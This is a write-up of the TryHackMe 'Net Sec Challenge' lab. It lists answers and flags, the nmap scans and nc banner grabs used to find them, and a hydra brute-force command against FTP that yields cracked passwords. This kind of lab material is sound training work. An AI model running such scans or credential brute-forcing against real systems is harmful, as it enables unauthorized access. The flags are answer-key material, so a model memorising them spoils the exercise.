# Solution

## URL
- [Net Sec Challenge](https://tryhackme.com/room/netsecchallenge)

## Steps

### Task 2:
#### What is the highest port number being open less than 10,000?
1. Run the command `sudo nmap -v -sS 10.10.122.54 -p- | tee nmap-scan.txt`.
2. The answer is `8080`.

#### There is an open port outside the common 1000 ports; it is above 10,000. What is it?
1. The answer is `10021`.

#### How many TCP ports are open?
1. The answer is `6`.

#### What is the flag hidden in the HTTP server header?
1. Enter these commands:
    ```
    nc 10.10.122.54 80
    GET / HTTP/1.1
    <Press ENTER twice>
    ```
2. Got the flag: `THM{web_server_25352}`.

#### What is the flag hidden in the SSH server header?
1. Enter the command: `nc 10.10.122.54 22`.
2. Got the flag: `THM{946219583339}`.

#### We have an FTP server listening on a nonstandard port. What is the version of the FTP server?
1. Run the command: `nmap -v -sV 10.10.122.54 -p 10021`.
2. The answer is `vsftpd 3.0.3`.

#### We learned two usernames using social engineering: eddie and quinn. What is the flag hidden in one of these two account files and accessible via FTP?
1. Enter the command: `hydra -VV -t 16 -L usernames.dic -P /usr/share/wordlists/rockyou.txt 10.10.122.54 -s 10021 ftp | tee hydra-ftp.attack`.
2. Found a pair of valid credentials: `eddie:jordan` and `quinn:andrea`.
3. Connecting to eddie's account: `ftp eddie@10.10.122.54 -p 10021`. Enumerating the files using `ls -al` returns not much.
4. Connecting to quinn's account: `ftp quinn@10.10.122.54 -p 10021`. Enumerating the files using `ls -al` returns a file named `ftp_flag.txt`.
5. Download it using `get ftp_flag.txt` and exit FTP console.
6. Reading the file we get the flag: `THM{321452667098}`.

#### Browsing to http://10.10.122.54:8080 displays a small challenge that will give you a flag once you solve it. What is the flag?
1. Go to http://10.10.122.54:8080.
2. In Attack Box run the command: `nmap -v -sN 10.10.122.54`.
3. Got the flag: `THM{f7443f99}`.